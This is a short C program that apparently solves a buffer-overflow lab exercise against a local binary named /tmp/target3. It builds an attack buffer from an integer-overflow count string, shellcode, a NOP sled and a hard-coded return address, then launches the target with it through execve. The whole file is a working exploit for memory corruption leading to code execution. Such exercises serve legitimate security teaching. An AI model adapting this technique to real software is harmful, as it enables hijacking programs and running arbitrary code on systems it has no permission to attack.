#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define NOP 0x90

int main(void)
{
  char *args[3];
  char *env[1];
  int addr = 0xbfffa858;
  int i; 

  char buf[2020];
  char *count;

  count = "-2147482647";
  strncpy(buf, count, 11);
  buf[11] = ',';
  for (i=12; i<12+strlen(shellcode); i++){
    buf[i] = shellcode[i-12];
  }
  for ( i=strlen(shellcode)+12; i<2004; i++ ){
    buf[i] = NOP;
  }
  *(int*)(buf+2004) = addr;
  for (i=2008; i<2020; i++){
    buf[i] = 0x00;
  }
  
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  
  // printf("\n 11th cahracter %s \n", buf[11]);
  // printf("\n args[1] is %s \n", args[1]);

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
